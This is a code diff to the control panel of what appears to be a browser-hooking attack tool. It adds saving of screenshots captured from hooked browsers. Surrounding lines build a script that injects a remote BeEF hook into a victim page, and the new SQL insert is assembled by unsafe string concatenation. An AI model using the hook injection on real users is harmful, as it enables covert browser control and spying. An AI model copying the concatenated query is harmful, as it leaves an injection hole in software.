@@ -333,6 +333,11 @@ display:none;
   <div class="modal-body">
     <img id=screenshot />
   </div>
+  <div class="modal-footer">
+    <input type="textbox" id=screenshot-description class="row-fluid" placeholder="Give this screenshot a description">
+    <button type="button" id=screenshot-save class="btn btn-secondary">Save Screenshot</button>
+    <button type="button" id=screenshot-open class="btn btn-secondary">Open in Tab</button>
+  </div>
 </div>
 
 <div class="modal" id="choose-hook-modal">
@@ -416,6 +421,12 @@ var ws;
 // current hook name
 var hook = localStorage['lastHook'] || '';
 var currentTab = null;
+
+var db = openDatabase('screenShots', '1.0', 'Screenshots', 500 * 1024 * 1024); // Open database, some really large estimated number in size (500mb)
+
+db.transaction(function (tx) {
+  tx.executeSql('CREATE TABLE IF NOT EXISTS list (id INTEGER PRIMARY KEY ASC, hook TEXT, date INTEGER, description TEXT, image TEXT)'); // Maybe image should be converted to blob later, with binary data?
+});
 
 function updateHookName(hookName) {
     if (hookName == undefined || hookStorage.retrieve(hook, 'name') == undefined){
@@ -767,8 +778,7 @@ $(function() {
             al("Cancelled BeEF hooking");
             return;
         }
-        var step1 = "(function() {\n\
-var d=document;\n\
+        var step1 = "(function() {\n var d=document;\n\
 var s = d.createElement('script');\n\
 s.src = " + JSON.stringify(beef) + "; // BeEF hook here\n\
 s.setAttribute('onload','beef_init();');\n\
@@ -835,6 +845,19 @@ d.body.appendChild(s);\n\
         refreshPersistentScriptList([]);
         fillDataTemplate($('#tab-ext-info'), {});
         sendCmd('report');
+    });
+
+    $('#screenshot-save').click(function() {
+        db.transaction(function(tx){
+            tx.executeSql('INSERT INTO list (hook,date,description,image) VALUES ("'+hook+'",strftime("%s"),"'+$('#screenshot-description').attr('value').replace('"','&quot;')+'","'+$('#screenshot').attr('src')+'");')
+        })
+        al('Screenshot saved!')
+        log('Screenshot saved!')
+        $('#screenshot-modal').modal('hide');
+    });
+
+    $('#screenshot-open').click(function() {
+        a=window.open($('#screenshot').attr('src'))
     });
 
     $(document).on('click', '#links a', function() {
